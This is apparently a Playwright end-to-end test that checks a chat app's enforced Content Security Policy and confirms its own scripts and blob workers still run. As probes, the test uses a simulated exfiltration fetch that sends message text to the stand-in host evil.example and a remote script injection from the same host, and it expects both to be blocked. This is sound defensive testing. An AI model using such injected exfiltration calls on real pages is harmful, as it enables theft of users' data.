// e2e-product: @chat
// e2e-area: @turn
import { test, expect } from './helpers/test';

// A script injected into the page itself could send what it reads to any server until
// connect-src and script-src were enforced; they shipped report-only first (CUR-3187). These check
// the enforced policy on the deployed build: the page loads with no violation of its own, a request
// or script pointed at another host is refused, and the things the app relies on still run (an
// inline script, a fetch to our own origin, and a blob: worker, which artifacts start).

function sourcesFor(policy: string, directive: string): string[] {
	const entry = policy
		.split(';')
		.map((part) => part.trim().split(/\s+/))
		.find(([name]) => name === directive);
	return entry ? entry.slice(1) : [];
}

test(
	'/chat enforces connect-src and script-src, refuses another host, and still runs its own scripts and blob workers',
	{ tag: ['@CUR-3188'] },
	async ({ page }) => {
		test.setTimeout(90_000);
		// Collect violations from the first byte, so one raised while the app boots counts.
		await page.addInitScript(() => {
			const seen: string[] = [];
			(window as unknown as { __cspViolations: string[] }).__cspViolations = seen;
			document.addEventListener('securitypolicyviolation', (event) => {
				seen.push(`${event.effectiveDirective} ${event.blockedURI}`);
			});
		});
		const response = await page.goto('/chat', { waitUntil: 'networkidle' });
		const headers = response?.headers() ?? {};
		const policy = headers['content-security-policy'] ?? '';
		const reportOnly = headers['content-security-policy-report-only'] ?? '';

		for (const directive of ['connect-src', 'script-src', 'worker-src', 'frame-src']) {
			expect(
				sourcesFor(policy, directive),
				`${directive} is missing from the enforced policy: "${policy}"`
			).not.toHaveLength(0);
			expect(
				sourcesFor(reportOnly, directive),
				`${directive} is still report-only: "${reportOnly}"`
			).toHaveLength(0);
		}
		expect(sourcesFor(policy, 'connect-src')).not.toContain('*');
		expect(sourcesFor(policy, 'connect-src')).not.toContain('https:');
		expect(sourcesFor(policy, 'worker-src')).toContain('blob:');
		// An artifact script can navigate its srcdoc frame anywhere; only this list stops it.
		expect(sourcesFor(policy, 'frame-src')).not.toContain('*');
		expect(sourcesFor(policy, 'frame-src')).not.toContain('https:');
		// Every Tally popup (lib/tally.ts) renders its form in a tally.so iframe.
		expect(sourcesFor(policy, 'frame-src')).toContain('https://tally.so');
		// The notebooks block frames www.oso.xyz, which redirects to www.artio.so; both hops are checked.
		expect(sourcesFor(policy, 'frame-src')).toContain('https://www.oso.xyz');
		expect(sourcesFor(policy, 'frame-src')).toContain('https://www.artio.so');
		// An enforced block reports through the Reporting API where the browser has it, and through
		// report-uri where it doesn't; report-to names a group only Reporting-Endpoints defines.
		const reportUri = sourcesFor(policy, 'report-uri');
		expect(reportUri, `the enforced policy has no report-uri: "${policy}"`).toHaveLength(1);
		expect(sourcesFor(policy, 'report-to')).toEqual(['posthog']);
		expect(headers['reporting-endpoints'] ?? '').toBe(`posthog="${reportUri[0]}"`);
		// A nonce or hash makes the browser ignore 'unsafe-inline', which the theme script needs.
		expect(
			sourcesFor(policy, 'script-src').filter((s) => /^'(nonce|sha\d+)-/.test(s)),
			`script-src carries a nonce or hash: "${policy}"`
		).toHaveLength(0);

		const atLoad = await page.evaluate(() =>
			(window as unknown as { __cspViolations: string[] }).__cspViolations.slice()
		);
		expect(
			atLoad.filter((v) => /^(connect-src|script-src|script-src-elem|worker-src) /.test(v)),
			'/chat raised a CSP violation of its own while loading'
		).toEqual([]);

		const result = await page.evaluate(async () => {
			const violations = (window as unknown as { __cspViolations: string[] }).__cspViolations;
			const before = violations.length;
			const fetched = async (url: string) => {
				try {
					await fetch(url, { mode: 'no-cors' });
					return true;
				} catch {
					return false;
				}
			};
			const remoteFetch = await fetched('https://evil.example/collect?d=earlier-message-text');
			const ownFetch = await fetched('/favicon.svg');

			const remoteScript = await new Promise<boolean>((resolve) => {
				const s = document.createElement('script');
				s.onload = () => resolve(true);
				s.onerror = () => resolve(false);
				s.src = 'https://evil.example/x.js';
				document.body.append(s);
			});
			const inline = document.createElement('script');
			inline.textContent = 'window.__inlineRan = true;';
			document.body.append(inline);
			const inlineRan = (window as unknown as { __inlineRan?: boolean }).__inlineRan === true;

			const workerAnswer = await new Promise<string>((resolve) => {
				try {
					const url = URL.createObjectURL(
						new Blob(['postMessage("worker-ok")'], { type: 'text/javascript' })
					);
					const worker = new Worker(url);
					worker.onmessage = (e) => resolve(String(e.data));
					worker.onerror = () => resolve('worker-error');
					setTimeout(() => resolve('worker-timeout'), 5_000);
				} catch (error) {
					resolve(`worker-threw ${(error as Error).message}`);
				}
			});
			// Violation events are queued; give them a turn to land.
			await new Promise((r) => setTimeout(r, 200));
			return {
				remoteFetch,
				ownFetch,
				remoteScript,
				inlineRan,
				workerAnswer,
				violations: violations.slice(before)
			};
		});

		// Controls first, so a pass below cannot come from injection not working at all.
		expect(result.ownFetch, 'a fetch to our own origin failed').toBe(true);
		expect(result.inlineRan, 'an inline script did not run, so the theme script would not').toBe(
			true
		);
		expect(result.workerAnswer, 'a blob: worker did not start, so artifact workers would not').toBe(
			'worker-ok'
		);

		expect(result.remoteFetch, 'a fetch to evil.example went through').toBe(false);
		expect(result.remoteScript, 'a script from evil.example loaded').toBe(false);
		expect(
			result.violations.some((v) => v.startsWith('connect-src https://evil.example')),
			`no connect-src violation for evil.example: ${JSON.stringify(result.violations)}`
		).toBe(true);
		expect(
			result.violations.some((v) => /^script-src(-elem)? https:\/\/evil\.example/.test(v)),
			`no script-src violation for evil.example: ${JSON.stringify(result.violations)}`
		).toBe(true);
	}
);
